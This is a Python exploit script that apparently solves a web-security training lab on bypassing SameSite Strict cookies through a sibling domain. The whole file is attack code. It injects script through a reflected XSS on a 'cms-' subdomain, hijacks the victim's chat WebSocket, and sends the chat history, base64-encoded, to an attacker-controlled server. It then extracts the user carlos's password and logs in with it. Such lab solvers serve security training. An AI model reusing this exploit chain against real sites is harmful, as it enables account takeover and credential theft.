# SameSite Strict bypass via sibling domain

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def encode_url_allchars(string):
	return ''.join("%{0:0>2x}".format(ord(char)) for char in string)

def decode_url_allchars(string):
	return ''.join(chr(int(c, 16)) for c in re.findall(r'%([0-9A-Fa-f]{2,6})', string))

def get_csrf_token(s, url):
	r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_carlos(s, url, password):
	login_path = url + '/login'
	csrf_token = get_csrf_token(s, login_path)
	login_data = {"username": "carlos", "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	if r.status_code == 200 and 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	else:
		print('[-] The exploit Failed to log in as Carlos <!>')
		return False

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Encoding payload:\n%s' % decode_url_allchars(payload))
	print('\n[+] Using encoded payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r2

def send_csrf(s, url, payload, attacker):
	websocket = url.replace('https', 'wss')
	chat_path = websocket + '/chat'
	cms_url = url.replace('https://', 'https://cms-')
	login_path = cms_url + '/login'
	if payload == "SOLUTION":
		script_payload = """<script>
var ws = new WebSocket('""" + chat_path + """');
ws.onopen = function() {
  ws.send("READY");
}
ws.onmessage = function(event) {
  fetch('""" + attacker + """/log?data=' + btoa(event.data), {method: 'GET', mode: 'no-cors'});
}
</script>
"""
	else:
		script_payload = payload
	exploit_body = """<html>
<body>
<script>
window.location.href = \"""" + login_path + """?username=""" + encode_url_allchars(script_payload) + """&password=password"
</script>
</body>
</html>"""
	r = deliver_payload(s, login_path, exploit_body, attacker)
	time.sleep(2)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD> \n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net $(cat payload01.html)\n\t->\tReplace url in the payload file (line 2) and Collaborator (line 7)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: SameSite Strict bypass via sibling domain')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		input_payload = sys.argv[3:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a cross-site forged request attack to the victim...')
			r = send_csrf(s, url, payload, attacker)
			time.sleep(2)
			if r.status_code == 200:
				time.sleep(2)

				print('\n[+] Trying to retrieve Carlos password in the Chat history...')
				r = s.get(attacker + '/log')
				res = r.text
				if '/log?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO' in res:
					encoded_messages = re.findall("data=(.*) HTTP/", res)
					for m in encoded_messages:
						if 'eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO' in m:
							enc_message = m
							break
					message = base64.b64decode(enc_message).decode('ascii')
					print('[+] Retrieving the message:\n\t%s' % message)
					password = re.search('it&apos;s (.*)"}', message).group(1)
					print('[+] Found Carlos password:\t%s' % password)
					print("\n[+] Trying to Log in with Carlos's password found in the Chat history...")
					r = connect_as_carlos(s, url, password)
				time.sleep(3)
				r = s.get(url)
				if r and 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
				elif r:
					print('[+] The Exploit sent the given payload !')
				else:
					print('\n[-] The Exploit Failed to log in as Carlos with given password <!>')

			else:
				print('\n[-] The Exploit Failed to send the payload <!>')

	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
